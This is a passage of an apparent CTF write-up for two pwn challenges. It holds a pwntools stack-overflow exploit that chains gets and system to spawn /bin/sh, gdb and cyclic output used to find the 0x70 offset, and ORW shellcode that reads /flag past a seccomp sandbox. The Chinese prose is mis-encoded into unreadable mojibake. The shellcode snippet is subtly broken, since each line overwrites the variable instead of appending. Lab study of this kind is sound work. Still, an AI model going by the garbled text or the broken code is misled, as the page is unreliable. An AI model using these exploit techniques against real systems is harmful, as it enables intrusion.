<p><strong>å˜é‡æœ‰æ•ˆæ€§</strong>ï¼šä¸ç®¡æ˜¯systemã€å¸¸è§çš„printfã€readè¿™äº›å‡½æ•°éƒ½æ˜¯è¦æœ‰å‚æ•°çš„ï¼Œä¸æ˜¯ç®€ç®€å•å•æ”¾ä¸€ä¸ªå­—ç¬¦ä¸²å°±å¯ä»¥äº†ï¼Œå˜é‡éœ€è¦åœ¨ç¨‹åºä¸­æœ‰åœ°å€ï¼Œè¿™æ ·ç¨‹åºæ‰èƒ½æ‰¾åˆ°å®ƒï¼Œå•ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼Œå› ä¸ºæ²¡æœ‰åˆ†é…å†…å­˜åœ°å€ã€‚</p>
</blockquote></blockquote>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn5&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = remote(&#39;ip&#39;,port)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn5&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sys_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">gets_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;gets&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">bss_addr</span> <span class="o">=</span> <span class="mh">0x0804A080</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x70</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">gets_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bss_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bss_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯¹äºç¼“å†²åŒºå¤§å°ï¼Œä¸æ˜¯0x64+4å—ï¼Ÿè¿™é‡Œæ˜¯ä¸€ä¸ªå‘ï¼Œè¿™é‡Œæˆ‘ä»¬å…·ä½“è¦ç”¨gdb+cyclicæ¥åˆ†æï¼š</p>
<blockquote>
<p>è¯¦ç»†æ­¥éª¤ï¼š</p>
<p>ç¬¬ä¸€æ­¥å…ˆç”Ÿæˆä¸ª200ä¸ªéšæœºå­—ç¬¦ï¼Œæ¯•ç«Ÿå¤§éƒ¨åˆ†å‚æ•°å®¹é‡å¤§å°ä¸ä¼šæœ‰200è¿™ä¹ˆå¤§å§ã€‚</p>
<p><img src="/p/2025bjtuctf-pwn/27.png"
	width="1234"
	height="700"
	srcset="/p/2025bjtuctf-pwn/27_hu_9fdc5f359675a8c3.png 480w, /p/2025bjtuctf-pwn/27_hu_9679a4272c52268.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="176"
		data-flex-basis="423px"
	
></p>
<p>å¤åˆ¶ï¼Œæ¥ç€ç»™getsæˆ–è€…mainå‡½æ•°æ–­ç‚¹ï¼Œå†è¾“å…¥rï¼ˆrunï¼‰è¿è¡Œç¨‹åºï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/28.png"
	width="1024"
	height="235"
	srcset="/p/2025bjtuctf-pwn/28_hu_cfdff1f9b904a577.png 480w, /p/2025bjtuctf-pwn/28_hu_8f8937c97037ab54.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="435"
		data-flex-basis="1045px"
	
></p>
<p>è¿™æ—¶å€™å°±ä¼šå‡ºç°å½©è‰²çš„è°ƒè¯•ç•Œé¢ï¼Œæœ‰äº›äººæ˜¯åœ¨ä¸€ä¸ªç»ˆç«¯çª—å£å‡ºç°çš„ï¼Œæˆ‘çš„æ˜¯åœ¨å¦å¤–ä¸€ä¸ªå¼¹å‡ºç»ˆç«¯çª—å£è°ƒè¯•ç•Œé¢çš„ã€‚</p>
<p><img src="/p/2025bjtuctf-pwn/29.png"
	width="1844"
	height="680"
	srcset="/p/2025bjtuctf-pwn/29_hu_723e5fc8721dfe54.png 480w, /p/2025bjtuctf-pwn/29_hu_871ebfdf20cb6050.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="271"
		data-flex-basis="650px"
	
></p>
<p>è¾“å…¥nï¼ˆnextï¼‰ï¼Œä¸€æ­¥æ­¥æ‰§è¡Œç¨‹åºï¼Œç›´åˆ°æŒ‡é’ˆæŒ‡å‘getså‡½æ•°éœ€è¦æˆ‘ä»¬è¾“å…¥å­—ç¬¦ä¸²çš„æ—¶å€™ï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/30.png"
	width="918"
	height="551"
	srcset="/p/2025bjtuctf-pwn/30_hu_2d1f76318ed7a140.png 480w, /p/2025bjtuctf-pwn/30_hu_c8647cc2bd3663a8.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="166"
		data-flex-basis="399px"
	
></p>
<p>è¾“å…¥ä¸Šæ¬¡ç”¨cyclicç”Ÿæˆçš„200ä¸ªéšæœºå­—ç¬¦ä¸²ã€‚</p>
<p>ç„¶åå†ä¸‹ä¸€æ­¥nï¼Œç›´åˆ°å´©æºƒï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/31.png"
	width="1829"
	height="781"
	srcset="/p/2025bjtuctf-pwn/31_hu_6a998d03905e8d9f.png 480w, /p/2025bjtuctf-pwn/31_hu_2fdb64548d423995.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="234"
		data-flex-basis="562px"
	
></p>
<p>å‡ºç°äº†<code>SIGSEGV</code>å´©æºƒæ ‡è¯†ï¼Œå³è¾¹æ˜¯æˆ‘ä»¬æ³¨å…¥çš„200ä¸ªéšæœºå­—ç¬¦ä¸²çš„ç»“æœã€‚</p>
<p>å»è°ƒè¯•ç•Œé¢ï¼Œçœ‹EIPçŠ¶å†µï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/32.png"
	width="1574"
	height="279"
	srcset="/p/2025bjtuctf-pwn/32_hu_7f3f313c5c0cdba7.png 480w, /p/2025bjtuctf-pwn/32_hu_7dab00d44516b1f3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="564"
		data-flex-basis="1353px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<span class="o">[</span> REGISTERS <span class="o">]</span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
</span></span><span class="line"><span class="cl">EAX  0x0
</span></span><span class="line"><span class="cl">EBX  0x0
</span></span><span class="line"><span class="cl">ECX  0xf7fac5c0 <span class="o">(</span>_IO_2_1_stdin_<span class="o">)</span> â—‚â€” 0xfbad2288
</span></span><span class="line"><span class="cl">EDX  0xf7fad89c <span class="o">(</span>_IO_stdfile_0_lock<span class="o">)</span> â—‚â€” 0x0
</span></span><span class="line"><span class="cl">EDI  0x0
</span></span><span class="line"><span class="cl">ESI  0xf7fac000 <span class="o">(</span>_GLOBAL_OFFSET_TABLE_<span class="o">)</span> â—‚â€” 0x1d7d8c
</span></span><span class="line"><span class="cl">EBP  0x62616163 <span class="o">(</span><span class="s1">&#39;caab&#39;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">ESP  0xffffcf10 â—‚â€” <span class="s1">&#39;eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&#39;</span>
</span></span><span class="line"><span class="cl">EIP  0x62616164 <span class="o">(</span><span class="s1">&#39;daab&#39;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<span class="o">[</span> DISASM <span class="o">]</span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
</span></span><span class="line"><span class="cl">Invalid address 0x62616164
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<span class="o">[</span> STACK <span class="o">]</span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
</span></span><span class="line"><span class="cl">00:0000â”‚ esp  0xffffcf10 â—‚â€” <span class="s1">&#39;eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&#39;</span>
</span></span><span class="line"><span class="cl">01:0004â”‚      0xffffcf14 â—‚â€” <span class="s1">&#39;faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&#39;</span>
</span></span><span class="line"><span class="cl">02:0008â”‚      0xffffcf18 â—‚â€” <span class="s1">&#39;gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&#39;</span>
</span></span><span class="line"><span class="cl">03:000câ”‚      0xffffcf1c â—‚â€” <span class="s1">&#39;haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&#39;</span>
</span></span><span class="line"><span class="cl">04:0010â”‚      0xffffcf20 â—‚â€” <span class="s1">&#39;iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&#39;</span>
</span></span><span class="line"><span class="cl">05:0014â”‚      0xffffcf24 â—‚â€” <span class="s1">&#39;jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&#39;</span>
</span></span><span class="line"><span class="cl">06:0018â”‚      0xffffcf28 â—‚â€” <span class="s1">&#39;kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&#39;</span>
</span></span><span class="line"><span class="cl">07:001câ”‚      0xffffcf2c â—‚â€” <span class="s1">&#39;laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&#39;</span>
</span></span><span class="line"><span class="cl">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<span class="o">[</span> BACKTRACE <span class="o">]</span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
</span></span><span class="line"><span class="cl">â–º f <span class="m">0</span> <span class="m">62616164</span>
</span></span><span class="line"><span class="cl">  f <span class="m">1</span> <span class="m">62616165</span>
</span></span><span class="line"><span class="cl">  f <span class="m">2</span> <span class="m">62616166</span>
</span></span><span class="line"><span class="cl">  f <span class="m">3</span> <span class="m">62616167</span>
</span></span><span class="line"><span class="cl">  f <span class="m">4</span> <span class="m">62616168</span>
</span></span><span class="line"><span class="cl">  f <span class="m">5</span> <span class="m">62616169</span>
</span></span><span class="line"><span class="cl">  f <span class="m">6</span> 6261616a
</span></span><span class="line"><span class="cl">  f <span class="m">7</span> 6261616b
</span></span></code></pre></td></tr></table>
</div>
</div><p>åœ¨åˆ©ç”¨ <code>cyclic</code> å·¥å…·è¿›è¡Œç¼“å†²åŒºæº¢å‡ºæ¼æ´æµ‹è¯•æ—¶ï¼Œå…³æ³¨ <code>EIP</code> å¯„å­˜å™¨ä¸­å­˜å‚¨çš„å­—ç¬¦ä¸²ï¼ˆå®é™…ä¸Šæ˜¯ç‰¹å®šæ¨¡å¼çš„å­—ç¬¦åºåˆ—ï¼‰ï¼Œæ˜¯ä¸ºäº†<strong>ç²¾ç¡®å®šä½è¦†ç›– <code>EIP</code> æ‰€éœ€çš„åç§»é‡</strong>ï¼Œè¿™æ˜¯æ¼æ´åˆ©ç”¨çš„å…³é”®æ­¥éª¤ã€‚</p>
</blockquote>
<p>è¿™æ—¶ï¼ŒEIPè¢«â€œdaabâ€æ‰€è¦†ç›–ï¼Œè¿™é‡Œç”¨cyclicå·¥å…·æŸ¥æ­¤æ—¶çš„åç§»é‡ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cyclic -l <span class="s1">&#39;xxxx&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/2025bjtuctf-pwn/33.png"
	width="863"
	height="129"
	srcset="/p/2025bjtuctf-pwn/33_hu_eb98ac78cfc2f92b.png 480w, /p/2025bjtuctf-pwn/33_hu_edd66b0e285dce89.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="668"
		data-flex-basis="1605px"
	
></p>
<p>112çš„åå…­è¿›åˆ¶æ˜¯0x70ï¼Œæˆ‘ä»¬ç¨‹åºéœ€è¦è¦†ç›–çš„å¤§å°åº”è¯¥æ˜¯0x70ã€‚</p>
<p>å¯¹äºpayloadï¼š</p>
<ul>
<li><code>p32(gets_addr)</code>ï¼š<code>gets_addr</code> æ˜¯ <code>gets</code> å‡½æ•°åœ¨ç¨‹åº PLTï¼ˆè¿‡ç¨‹é“¾æ¥è¡¨ï¼‰ä¸­çš„åœ°å€ï¼ˆæ•´æ•°å½¢å¼ï¼‰ã€‚é€šè¿‡ <code>p32</code>ï¼Œå°†è¿™ä¸ª<strong>32 ä½çš„åœ°å€æ•´æ•°</strong>è½¬æ¢æˆ<strong>å°ç«¯å­—èŠ‚åºçš„ 32 ä½äºŒè¿›åˆ¶æ•°æ®</strong>ï¼Œè¿™æ ·å½“ payload è¢«ç¨‹åºæ¥æ”¶å¹¶å¤„ç†æ—¶ï¼Œå†…å­˜ä¸­å°±èƒ½æ­£ç¡®å­˜å‚¨ <code>gets</code> å‡½æ•°çš„åœ°å€ï¼Œä¸ºåç»­è°ƒç”¨ <code>gets</code> å‡½æ•°åšå‡†å¤‡ã€‚</li>
<li><code>p32(sys_addr)</code>ï¼š<code>sys_addr</code> æ˜¯ <code>system</code> å‡½æ•°åœ¨ PLT ä¸­çš„åœ°å€ï¼ˆæ•´æ•°å½¢å¼ï¼‰ã€‚åŒæ ·ï¼Œ<code>p32</code> æŠŠè¿™ä¸ªåœ°å€è½¬æ¢æˆå°ç«¯å­—èŠ‚åºçš„ 32 ä½äºŒè¿›åˆ¶æ•°æ®ï¼Œç›®çš„æ˜¯è®©ç¨‹åºåç»­èƒ½æ­£ç¡®è·³è½¬åˆ° <code>system</code> å‡½æ•°æ‰§è¡Œã€‚</li>
<li>ä¸¤ä¸ª <code>p32(bss_addr)</code>ï¼š<code>bss_addr</code> æ˜¯ç¨‹åº <code>.bss</code> æ®µçš„ä¸€ä¸ªåœ°å€ï¼ˆæ•´æ•°å½¢å¼ï¼‰ã€‚ç¬¬ä¸€ä¸ª <code>p32(bss_addr)</code> æ˜¯ä½œä¸º <code>system</code> å‡½æ•°çš„<strong>è¿”å›åœ°å€</strong>ï¼ˆä¸è¿‡åœ¨è¿™ä¸ªåˆ©ç”¨é€»è¾‘é‡Œï¼Œæ›´å…³é”®çš„æ˜¯ç¬¬äºŒä¸ª <code>p32(bss_addr)</code>ï¼‰ï¼›ç¬¬äºŒä¸ª <code>p32(bss_addr)</code> æ˜¯ä½œä¸º <code>gets</code> å‡½æ•°çš„<strong>å‚æ•°</strong>ï¼Œæ„æ€æ˜¯è®© <code>gets</code> å‡½æ•°æŠŠç”¨æˆ·è¾“å…¥ï¼ˆè¿™é‡Œæ˜¯ <code>/bin/sh</code>ï¼‰å†™å…¥åˆ° <code>bss_addr</code> å¯¹åº”çš„å†…å­˜ä½ç½®ã€‚ä¹‹åè°ƒç”¨ <code>system</code> å‡½æ•°æ—¶ï¼Œå°±ä¼šä»¥ <code>bss_addr</code> å¤„çš„ <code>/bin/sh</code> ä½œä¸ºå‚æ•°ï¼Œæ‰§è¡Œ <code>system(&quot;/bin/sh&quot;)</code> æ¥è·å– shellã€‚</li>
</ul>
<p>å°ç»“ï¼šæ€»çš„æ¥è¯´è¿™é¢˜å¯¹æ–°æ‰‹ä¸ç®—å‹å¥½ï¼Œä½†åœ¨PWNæ‰‹æ¥è¯´ç®—åŸºæœ¬æ“ä½œã€‚</p>
<h3 id="pwn6">pwn6
</h3><p><a class="link" href="pwn6" >pwn6</a></p>
<p>checksecä¿æŠ¤ä¿¡æ¯ï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/34.png"
	width="845"
	height="263"
	srcset="/p/2025bjtuctf-pwn/34_hu_8fb59eb19fd9b103.png 480w, /p/2025bjtuctf-pwn/34_hu_455cd7f02188e3aa.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="321"
		data-flex-basis="771px"
	
></p>
<p>IDA åˆ†æï¼ˆä¾æ®å‡½æ•°åŠŸèƒ½ä¿®æ”¹å¯¹åº”å‡½æ•°åï¼‰ï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/35.png"
	width="814"
	height="176"
	srcset="/p/2025bjtuctf-pwn/35_hu_d7631b7771746ca0.png 480w, /p/2025bjtuctf-pwn/35_hu_322c14539a0c3e1f.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="462"
		data-flex-basis="1110px"
	
></p>
<p>çœ‹åˆ°äº†é™Œç”Ÿçš„mmapå‡½æ•°ï¼š</p>
<p>1ã€å°†ä¸€ä¸ªæ™®é€šæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œé€šå¸¸åœ¨éœ€è¦å¯¹æ–‡ä»¶è¿›è¡Œé¢‘ç¹è¯»å†™æ—¶ä½¿ç”¨ï¼Œè¿™æ ·ç”¨å†…å­˜è¯»å†™å–ä»£ I/O è¯»å†™ï¼Œä»¥è·å¾—è¾ƒé«˜çš„æ€§èƒ½ï¼›</p>
<p>2ã€å°†ç‰¹æ®Šæ–‡ä»¶è¿›è¡ŒåŒ¿åå†…å­˜æ˜ å°„ï¼Œå¯ä»¥ä¸ºå…³è”è¿›ç¨‹æä¾›å…±äº«å†…å­˜ç©ºé—´ï¼›</p>
<p>3ã€ä¸ºæ— å…³è”çš„è¿›ç¨‹æä¾›å…±äº«å†…å­˜ç©ºé—´ï¼Œä¸€èˆ¬ä¹Ÿæ˜¯å°†ä¸€ä¸ªæ™®é€šæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ä¸­ã€‚</p>
<p>é‚£è¿™é‡Œçš„mmapå‡½æ•°ä½œç”¨å°±æ˜¯æŠŠä» 0x123000 å¼€å§‹çš„åœ°å€ï¼Œå¤§å°ä¸º 0x1000 çš„é•¿åº¦ï¼Œæƒé™æ”¹ä¸º<code>å¯å†™å¯æ‰§è¡Œ</code>ã€‚</p>
<p>è·Ÿè¿›seccompå‡½æ•°ï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/36.png"
	width="659"
	height="229"
	srcset="/p/2025bjtuctf-pwn/36_hu_bb7d6420985b7af.png 480w, /p/2025bjtuctf-pwn/36_hu_d75702cd3f02c2cf.png 1024w"
	loading="lazy"
	
		alt="seccompå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="287"
		data-flex-basis="690px"
	
></p>
<p>seccomp ä¸»è¦ç”¨äºé…ç½®å’ŒåŠ è½½ <strong>Seccompï¼ˆSecure Computing Modeï¼Œå®‰å…¨è®¡ç®—æ¨¡å¼ï¼‰</strong> ç­–ç•¥ï¼Œæ¥é™åˆ¶ç¨‹åºå¯ä»¥æ‰§è¡Œçš„ç³»ç»Ÿè°ƒç”¨ï¼Œä»¥å¢å¼ºç¨‹åºçš„å®‰å…¨æ€§ã€‚</p>
<p>PWNç»å…¸é¢˜ç›®â€”â€”æ²™ç®±é€ƒé€¸ï¼ˆå¯¹ç«‹æ˜¯æ²™ç›’è¿‡æ»¤ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">seccomp-tools dump ./pwn6
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/2025bjtuctf-pwn/37.png"
	width="1000"
	height="420"
	srcset="/p/2025bjtuctf-pwn/37_hu_74b02b51fe25acd4.png 480w, /p/2025bjtuctf-pwn/37_hu_1b79fc9f7f08f1cc.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="238"
		data-flex-basis="571px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œåªæœ‰ readï¼Œwriteï¼Œopenï¼Œexit å¯ä»¥ä½¿ç”¨ï¼Œä½¿ç”¨ openâ€“&gt;readâ€“&gt;write è¿™æ ·çš„ orw çš„æ–¹å¼ã€‚</p>
<blockquote>
<p>ORW æŒ‡çš„æ˜¯ Open-Read-Write æŠ€æœ¯ï¼Œæ˜¯ä¸€ç§åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨è¯»å–æ–‡ä»¶å†…å®¹ï¼ˆå¦‚ flag æ–‡ä»¶ï¼‰çš„æ”»å‡»æ–¹æ³•ã€‚</p>
<p>ORW é€šè¿‡ä»¥ä¸‹ä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨å®ç°ï¼š</p>
<p>openï¼šæ‰“å¼€ç›®æ ‡æ–‡ä»¶ï¼Œè·å–æ–‡ä»¶æè¿°ç¬¦ã€‚</p>
<p>readï¼šé€šè¿‡æ–‡ä»¶æè¿°ç¬¦è¯»å–æ–‡ä»¶å†…å®¹åˆ°ç¼“å†²åŒºã€‚</p>
<p>writeï¼šå°†ç¼“å†²åŒºçš„å†…å®¹å†™å…¥æ ‡å‡†è¾“å‡ºã€‚</p>
</blockquote>
<p>è·Ÿè¿›BJTUCTFå‡½æ•°ï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/38.png"
	width="731"
	height="169"
	srcset="/p/2025bjtuctf-pwn/38_hu_660cf8137fd7fe67.png 480w, /p/2025bjtuctf-pwn/38_hu_149b3fbe01ccde64.png 1024w"
	loading="lazy"
	
		alt="BJTUCTFå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="432"
		data-flex-basis="1038px"
	
></p>
<p>çœ‹åˆ°äº†æ˜æ˜¾çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œåœ¨ä¸Šé¢æˆ‘æåŠè¿‡ mmap å‡½æ•°ï¼Œåœ¨ main å‡½æ•°å·²ç»æ‰§è¡Œè¿‡ä¸€æ¬¡äº†ï¼Œåœ¨ 0x123000 è¿™é‡Œå·²ç»æœ‰å¯å†™å¯æ‰§è¡Œæƒé™äº†ã€‚åˆ°è¿™é‡Œï¼Œæ”»å‡»æ€è·¯å°±æ¯”è¾ƒæ¸…æ™°äº†ï¼Œæˆ‘ä»¬æƒ³åŠæ³•å¾€ mmap ç»™çš„è¿™ä¸ªåœ°å€æ®µé‡Œé¢å†™ shellcode (ORW)ï¼Œç„¶åè·³è½¬åˆ°è¿™é‡Œæ‰§è¡Œã€‚</p>
<p>é‚£æˆ‘ä»¬çš„ orw_shellcodeï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">mmap</span> <span class="o">=</span> <span class="mh">0x123000</span>
</span></span><span class="line"><span class="cl"><span class="n">orw_shellcode</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">orw_shellcode</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="n">mmap</span><span class="p">,</span><span class="mh">0x100</span><span class="p">)</span><span class="c1">## readé‡Œçš„fdå†™3æ˜¯å› ä¸ºç¨‹åºæ‰§è¡Œçš„æ—¶å€™æ–‡ä»¶æè¿°ç¬¦æ˜¯ä»3å¼€å§‹çš„ï¼Œwriteé‡Œçš„1æ˜¯æ ‡å‡†è¾“å‡ºåˆ°æ˜¾ç¤ºå™¨</span>
</span></span><span class="line"><span class="cl"><span class="n">orw_shellcode</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">mmap</span><span class="p">,</span><span class="mh">0x100</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">orw_shellcode</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>shellcode å·²ç»ç¼–å¥½äº†ï¼Œç°åœ¨ç¼– payload è®©ç¨‹åºå¬æˆ‘ä»¬è¯ï¼Œå°† shellcode æ³¨å…¥è¿›å†…å­˜ä¸­å»ã€‚</p>
<p>shellcraft.read çš„ä½œç”¨æ˜¯æ‰§è¡Œ read å‡½æ•°çš„åç»­æµç¨‹ â€”â€” è¯»å– 0x100 é•¿åº¦çš„å­—ç¬¦ï¼ˆä¹Ÿå°±æ˜¯åç»­çš„ orw_shellcodeï¼‰ï¼Œæ–‡ä»¶æè¿°ç¬¦ fd=3ï¼ˆ0ã€1ã€2 å·²è¢«æ ‡å‡†æ–‡ä»¶å ç”¨ï¼‰</p>
<p><code>shellcraft.write(1, mmap, 0x100)</code> çš„ <code>1</code> æ˜¯ <strong>Linux æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰çš„å›ºå®šæ–‡ä»¶æè¿°ç¬¦</strong>ï¼Œå…¶åŠŸèƒ½æ˜¯å°† <code>mmap</code> åŒºåŸŸä¸­å­˜å‚¨çš„ <code>\flag</code> å†…å®¹è¾“å‡ºåˆ°å±å¹•ï¼Œå½“æˆ printf ä¹Ÿè¡Œã€‚</p>
